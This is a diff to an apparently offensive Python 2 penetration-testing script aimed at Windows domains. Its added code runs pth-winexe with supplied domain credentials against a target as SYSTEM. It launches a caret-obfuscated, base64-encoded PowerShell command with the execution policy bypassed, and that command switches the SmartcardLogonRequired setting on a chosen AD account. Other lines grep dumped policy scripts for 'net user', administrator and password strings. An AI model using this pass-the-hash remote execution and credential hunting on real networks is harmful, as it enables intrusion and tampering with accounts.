@@ -1463,6 +1463,18 @@ if edq_scforceoption!='n':
 				print colored("[+]Querying the status of SCforceoption:",'green')
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
+
+				#Ask if we're a DC and try and change the AD account setting also 
+				response = raw_input("If this is a DC Would you like to turn on SmartCardLogonRequired AD Setting for an account : Y/(N) ")
+				if response in yesanswers:	
+					response = raw_input("Please enter the account name :")
+					print colored("[+]Turning on SmardCardLogonRequired for AD Account "+response+"...",'blue')
+					line="Import-Module ActiveDirectory\n"
+					line=line+"Set-ADUser "+response+" -SmartcardLogonRequired $true\n"
+					
+					en = b64encode(line.encode('UTF-16LE'))						
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+					print colored("[+]Task Completed for account - "+response+"...",'green')	
 				
 				sys.exit()	
 
@@ -1476,6 +1488,18 @@ if edq_scforceoption!='n':
 				print colored("[+]Querying the status of SCforceoption:",'green')
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
+
+				#Ask if we're a DC and try and change the AD account setting also 
+				response = raw_input("If this is a DC Would you like to turn off SmartCardLogonRequired AD Setting for an account : Y/(N) ")
+				if response in yesanswers:	
+					response = raw_input("Please enter the account name :")
+					print colored("[+]Turning off SmardCardLogonRequired for AD Account "+response+"...",'blue')
+					line="Import-Module ActiveDirectory\n"
+					line=line+"Set-ADUser "+response+" -SmartcardLogonRequired $false\n"
+					
+					en = b64encode(line.encode('UTF-16LE'))						
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+					print colored("[+]Task Completed for account - "+response+"...",'green')	
 
 				sys.exit()	
 	
@@ -2014,6 +2038,7 @@ if policiesscripts_dump=='y' or policiesscripts_dump=='yes':
 					print colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets[0]+'/scripts/','green')	
 					os.chdir(outputpath+targets[0]+'/scripts/')
 					os.system("pwd")
+					os.system("grep --color='auto' -ri net user")
 					os.system("grep --color='auto' -ri administrator")
 					os.system("grep --color='auto' -ri password")
 				if os.path.isdir(outputpath+targets[0]+'/Policies/'):
